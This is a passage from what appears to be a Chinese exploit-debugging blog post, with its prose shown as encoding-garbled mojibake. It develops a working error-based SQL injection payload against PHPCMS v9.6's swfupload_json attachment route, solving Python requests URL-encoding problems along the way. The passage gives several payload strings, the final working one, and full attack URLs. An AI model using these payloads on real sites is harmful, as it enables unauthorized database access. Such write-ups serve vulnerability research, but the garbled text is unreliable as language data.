ä¸Šé¢çš„åˆ†æå¾ˆæ¸…æ¥šçš„è¯´æ˜äº†é—®é¢˜ï¼Œå°±æ˜¯å¯¹ url å¤šè¿›è¡Œäº†ä¸€æ¬¡`encode`ã€‚é‚£ä¹ˆæ€ä¹ˆè§£å†³å‘¢ï¼Ÿè¿™æ—¶å€™æˆ‘çŒœçœ‹åˆ°è¿™é‡Œçš„äººä½ ä»¬è‚¯å®šæƒ³çš„æ˜¯å°† Step2 çš„ URL è¿›è¡Œ`urlencode`è§£ç ï¼Œç„¶åå†è¿½åŠ ä¸Šå»ï¼ˆæ˜¯ä¸æ˜¯ï¼Ÿï¼‰ï¼Œé‚£ä¹ˆä»£ç å¦‚ä¸‹ï¼š

```
payload = "%*27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=Tao"
url_two = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id={}".format(payload)
```

æ‰§è¡Œå¦‚ä¸‹å›¾ï¼ŒæŠ¥`Controller does not exist.`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saib1hC4eDyHF6dVs85QHbUBia3zBZhLRSmO5O2Fyr331uVN0YAKDBX9jQ/640?wx_fmt=png)

```
http://www.phpcms96.com/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%2526id=%25*27%20and%20updatexml(1,concat(1,(user())),1)%2523&modelid=1&catid=1&m=1&f=Tao
```

ç”±äºæ˜¯ MVC æ¶æ„ï¼Œæˆ‘ä»¬åé¢çš„`m=1`è·Ÿå‰é¢çš„`m=attachments`å†²çªäº†ã€‚æˆ‘ä»¬å°†åé¢çš„`m=1`åˆ é™¤è¯•ä¸€è¯•ã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sasZSY26ibNFFjCmZeOLqIrjH8adHiauD13cH1QFKehQeG8VLJUibAyyLgw/640?wx_fmt=png)

è¿˜æœ‰æœ‰é—®é¢˜å•Šï¼Œæ²¡æœ‰`&`ç¬¦ã€‚çœ‹åˆ°è¿™é‡Œï¼Œä½ è‚¯å®šåˆä¼šè§‰å¾—ï¼Œç›´æ¥æŠŠ id å‰é¢çš„`%26`æ”¹æˆ`&`ä¸å°±å¥½äº†å˜›ï¼Ÿ

```
payload = "%*27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=Tao"
url_two = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=&id={}".format(payload)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saUKtGELMhjMsiac0unWyKbqnGiabBjexj42BDzpTj1OMTpbticlhicNtO7w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sa7bsdjFruQvU0nwuBUOqdUcibjSxsmvyVRF0lBPh2tqFtt0XAD3n15Bg/640?wx_fmt=png)

`src=''`é‚£è¿™ä¸ªæ¼æ´å°±æ²¡æ³•åˆ©ç”¨ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªåˆ©ç”¨æ€è·¯çœŸçš„å¾ˆå¦™ã€‚

å°±æ˜¯åˆ é™¤äº†`m=1`, å°±æ²¡åŠæ³•è¿‡ä¸‹é¢çš„ä»£ç äº†ã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sagzek5tU1EJoTluFbRice3T96Lfib0eNUEXCfCicgDzVoFlQ1TTLabBKrg/640?wx_fmt=png)

å¥½äº†å¥½äº†ä¸ç»•äº†ï¼Œè¿˜æ˜¯æ•´ç†ä¸€ä¸‹æ¥è¯´å§ï¼ˆå‰é¢è¿˜æœ‰ä¸€äº›ç»†èŠ‚ç‚¹æ²¡è¯´åˆ°ï¼‰ã€‚å‰é¢è¯´äº†ä¸€å †ï¼Œå¤§æ¦‚æƒ…å†µæ€»ç»“ä¸‹æ¥å¦‚ä¸‹å›¾ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saiaz1iacfG2hiczEsa3DGa0k5JUwvUn77ibOogMR5sexeVdgfzhM3lwVwKQ/640?wx_fmt=png)

åˆ™è¿™ä¸€åˆ‡ä¸€åˆ‡åŸå› å°±æ˜¯`id=%*27`è¿™æ®µéƒ¨åˆ†ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿè´´ä¸‹å¤„ç† URL çš„ä»£ç å§ (é‡ç‚¹å…³æ³¨æ³¨é‡Š`!!!`çš„ä»£ç )

```
// requestsæºä»£ç  urllib3/util/url.pyæ–‡ä»¶

PERCENT_RE = re.compile(r"%[a-fA-F0-9]{2}")# !!!
.....
Â  Â component, percent_encodings = PERCENT_RE.subn(
Â  Â  Â  Â lambda match: match.group(0).upper(), component
Â  )# !!!

Â  Â uri_bytes = component.encode("utf-8", "surrogatepass")
Â  Â is_percent_encoded = percent_encodings == uri_bytes.count(b"%")# !!!
Â  Â encoded_component = bytearray()

Â  Â for i in range(0, len(uri_bytes)):
Â  Â  Â  Â # Will return a single character bytestring on both Python 2 & 3
Â  Â  Â  Â byte = uri_bytes[i : i + 1]
Â  Â  Â  Â byte_ord = ord(byte)
Â  Â  Â  Â if (is_percent_encoded and byte == b"%") or (# !!!
Â  Â  Â  Â  Â  Â byte_ord < 128 and byte.decode() in allowed_chars
Â  Â  Â  ):
Â  Â  Â  Â  Â  Â encoded_component += byte
Â  Â  Â  Â  Â  Â continue
Â  Â  Â  Â encoded_component.extend(b"%" + (hex(byte_ord)[2:].encode().zfill(2).upper()))

Â  Â return encoded_component.decode(encoding)
```

çœ‹åˆ°è¿™é‡Œï¼Œä½ åº”è¯¥çŸ¥é“æ€ä¹ˆå›äº‹äº†å§ï¼Œå¦‚æœä½ è¿˜ä¸çŸ¥é“ï¼Œä¹Ÿæ²¡å…³ç³»ã€‚æˆ‘ä»¬é€šè¿‡å¯¹æ¯”è§‚å¯Ÿç°è±¡æ¥è¯´æ˜é—®é¢˜ï¼š

*   è°ƒè¯•å°†`%`encode çš„ä»£ç 
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sarAYpT5cFljmr7tVGOP1zTv5qR2EgNebkNRkrytniak7YO2ZPZ3czaFg/640?wx_fmt=png)

*   è°ƒè¯•ä¸ä¼šå°†`%`encode çš„ä»£ç 
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saQt3TQsACE2kqWvKb8m4vKFy8TfJQnr04w9PmZXXH9kS4K9sibhWBylA/640?wx_fmt=png)

å…·ä½“æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè¯´ï¼Œå¤§æ¦‚å°±æ˜¯æˆ‘ä»¬ url ç¼–ç çš„æ•°æ®ï¼ˆæ¯”å¦‚`%27`ç­‰å¤šä¸ªï¼Œå®Œæ•´çš„ï¼‰é€šè¿‡æ­£åˆ™åŒ¹é…çš„ï¼Œéœ€è¦è·Ÿ`uri_bytes.count(b"%")`è·å–çš„ç›¸ç­‰ï¼Œè€Œè¿™é‡Œç”±äºå•ç‹¬çš„`%`ï¼ˆä¸ç›¸ç­‰ï¼‰ï¼Œå› æ­¤å°±ä¼šè¢«`encode`ã€‚

ç”±äº Step2 çš„ poc æ˜¯éœ€è¦ç»è¿‡`safe_replace`å¤„ç†ï¼Œç„¶åæ‹¼æ¥æ„é€ çš„ SQL è¯­å¥ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€è¦å°†`%`è¿›è¡Œ url ç¼–ç å³å¯ï¼Œäºæ˜¯æˆ‘ä»¬è„šæœ¬çš„ poc å¦‚ä¸‹ï¼š

```
payload = "%25*27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=Tao"
```

åˆ°äº†è¿™ä¸€æ­¥ï¼Œè¿˜æ²¡æœ‰å®Œï¼Œå› ä¸ºä¾æ—§æ²¡æ³•æˆåŠŸåˆ©ç”¨ï¼Œçœ‹ä¸‹å›¾ï¼Œè¿˜æ˜¯å‚æ•°é”™è¯¯ã€‚ï¼ˆåŸå› å°±æ˜¯å‰é¢æåˆ°çš„ MVC æ¶æ„ï¼Œè¿™é‡Œ m å†²çªçš„é—®é¢˜ï¼‰

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sanu48P94XRHo5e8Y2CzIWR5alg2mz7wriauQkg162DG4FY74dEA2oNrA/640?wx_fmt=png)

è°ƒè¯•çš„æ—¶å€™ç›´æ¥åˆ°äº† Step3 å“ªé‡Œã€‚`$a_k`è¿˜æ˜¯ç©ºï¼ˆè¯´æ˜æœªç»è¿‡`swfupload_json()`ï¼‰

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sazkyuib4yQHBib40pBfcibmROAnbhZOtHyleeXF2JBlbG2Eicz6UWeibCu5A/640?wx_fmt=png)

æ­£å¸¸æ¥è¯´æ‰§è¡Œå¦‚ä¸‹å›¾ï¼š

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5sao54dICUrlERMryMuCngialYdoLg09NbM1E2Z2qgyVLPhhicMR3ofXF1A/640?wx_fmt=png)

æ¶æ„ä»£ç æ˜¯é€šè¿‡ src å‚æ•°ä¼ å…¥çš„ï¼Œè€Œç¬¬ 3 å¤„å¯¹å…¶ä»–å˜é‡è¿›è¡Œäº†åˆ¤æ–­ã€‚æ ¹æ®å‰é¢åˆ†æçš„æˆªå›¾ï¼Œå·²çŸ¥è®¿é—® Step2 é“¾æ¥çš„æ—¶å€™ä¼šè¿›è¡Œ`decode`, æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†`&`è¿›è¡Œ url ç¼–ç ï¼Œæœ€ç»ˆçš„è„šæœ¬ poc å¦‚ä¸‹ï¼š

```
payload = "%25*27 and updatexml(1,concat(1,(user())),1)%23%26modelid=1%26catid=1%26m=1%26f=Tao"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saQWVMPIkgRmWJBj9hObIz9faZFlt0t5AicUkic2yGZqfcuibjvf7nlr77g/640?wx_fmt=png)

æ²¡é—®é¢˜äº†ï¼ï¼ï¼

è„šæœ¬æŠ¥é”™çš„ä¸»è¦åŸå› æ˜¯`id=%*27`ä¸­è¿™ä¸ª`%`æå¾—é¬¼ï¼ˆä½†æ˜¯è¿™ä¹ˆå†™ä¹Ÿæ˜¯ä¸€å®šçš„ï¼Œç»•è¿‡`safe_replace`å‡½æ•°ç„¶åæ‹¼æ¥ SQL è¯­å¥ï¼‰ã€‚è¿˜æœ‰`&`ã€‚ç”±æ­¤å¯çŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦å°†åé¢`id`åé¢çš„æ•°æ®ç¼–ç å°±å¯ä»¥æˆåŠŸåˆ©ç”¨ã€‚å½“ç„¶å•¦ï¼Œæœ€æ¨èå¾—å†™æ³•æ˜¯åˆ©ç”¨`quote`å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯è¿›è¡Œç‰¹æ®Šç¬¦å·çš„ encodeã€‚

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saemLJh8rcOEiaalEGbDe6IzEurYgH73VcjRp1weLbdhBTX7XbbicxkcsA/640?wx_fmt=png)

çœ‹åˆ°è¿™é‡Œï¼Œè‚¯å®šåˆä¼šæœ‰äººè¦é—®äº†ï¼Œä½ ä¸Šé¢è°ƒç”¨çš„æ˜¯`requests.utils.quote()`ï¼Œæ€ä¹ˆæ”¾çš„å›¾æ˜¯`urllib.parse.unquote()`ã€‚

> `urllib.parse.unquote`å®˜æ–¹æ–‡æ¡£æœ‰è¯´æ˜ï¼Œ`requests`æ˜¯ç¬¬ä¸‰æ–¹åº“ï¼Œå®ƒå®˜ç½‘æ–‡æ¡£æˆ‘æ²¡çœ‹åˆ°å¯¹æ­¤å‡½æ•°çš„è¯´æ˜ã€‚ä½†æ˜¯éƒ½æ˜¯ä¸€æ ·çš„ã€‚

ä½¿ç”¨è¿™ä¸ªå‡½æ•°åï¼Œè®¿é—®çš„ URL å¦‚ä¸‹ï¼š

```
'http://www.phpcms96.com/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%25%2A27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%2523%26modelid%3D1%26catid%3D1%26m%3D1%26f%3DTao'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5savmUic9k23VRibtbO808FtpQkcy5LQDt6wR4pK7EFhAvZZGAMdtNfEXxQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDC3xXLeakHSkxNxYAt4ia5saLD8R8WfXdWyJkEJUDlVgampoqmibd0mBc0GwJSlYCVXR3TmoEn4XNuA/640?wx_fmt=png)

æ–‡ç« ä¸­æœ‰ä»€ä¹ˆä¸è¶³å’Œé”™è¯¯çš„åœ°æ–¹è¿˜æœ›å¸ˆå‚…ä»¬æŒ‡æ­£ã€‚